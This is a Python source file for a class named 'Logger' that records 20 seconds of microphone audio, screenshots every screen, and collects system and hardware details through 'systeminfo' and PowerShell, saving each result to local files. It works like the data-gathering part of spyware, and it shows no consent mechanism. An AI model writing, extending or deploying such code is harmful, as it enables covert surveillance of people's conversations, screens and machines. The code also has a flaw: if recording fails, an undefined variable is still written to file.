from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
import subprocess
import logging

import sounddevice as sd
from scipy.io.wavfile import write
from PIL import ImageGrab


class Logger:
  def start(self):
    with ThreadPoolExecutor(
        max_workers=4) as executor:
      executor.submit(self.microphone)            
      executor.submit(self.screenshot)
      executor.submit(self.get_sysinfo)
      executor.submit(self.get_hardware_devices)

  def microphone(self):
    fs = 44100
    seconds = 20
    try:
      rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
      sd.wait()
    except sd.PortAudioError:
      logging.error("sound recording device is disabled")
    write("rec.wav", fs, rec)

  def screenshot(self):
    screenshot = ImageGrab.grab(bbox=None, all_screens=True)
    screenshot.save(f"{self.datetime("%d.%m.%y - %H;%M;%S")}.jpeg")

  def get_sysinfo(self):
    with open("systeminfo.txt", "w") as file:
      output = self.execute_command("systeminfo")
      file.write(output)        

  def get_hardware_devices(self):
    classes = str(
      self.execute_command(
        args=["powershell", "Get-PnpDevice | Select-Object -Property Class | Sort-Object -Property Class | Get-Unique -AsString"]
      )).strip().replace("\\n", "").split()
    with open("hardware_devices.txt", "w") as file:
      for class_ in classes[2:-2]:
        output = self.execute_command(["powershell", "Get-PnpDevice", "-Class", class_])
        file.write(output)

  def execute_command(self, args: str | list):
    command = subprocess.Popen(args=args, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, encoding="utf-8")
    output, error = command.communicate()
    if command.returncode == 0: 
        return output 
    else: logging.error(error)

  def datetime(self, format):
    return datetime.now().strftime(format)

  def __call__(self):
    self.start()